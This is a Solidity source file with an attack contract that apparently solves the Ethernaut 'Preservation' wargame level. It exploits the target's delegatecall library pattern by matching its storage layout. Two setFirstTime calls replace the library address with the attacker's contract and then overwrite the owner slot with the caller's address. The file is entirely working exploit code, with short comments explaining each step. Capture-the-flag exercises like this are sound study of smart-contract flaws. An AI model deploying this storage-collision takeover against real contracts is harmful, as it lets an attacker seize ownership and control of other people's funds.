// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint)external;
}

contract Attack{
  //we have to have the same storage layout as in tye Preservation contract
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function attack(IPreservation preservation)external{
    //first call updates address timeZone1Library to the address of this contract
    preservation.setFirstTime(uint(uint160(address(this))));
    //second call is calling the function setTime() from this contract 
    //and its passing msg.sender as an argument
    preservation.setFirstTime(uint(uint160(msg.sender)));

  } 
  function setTime(uint _time)public{
    //updates the owner
    owner=address(uint160(_time));
  }
}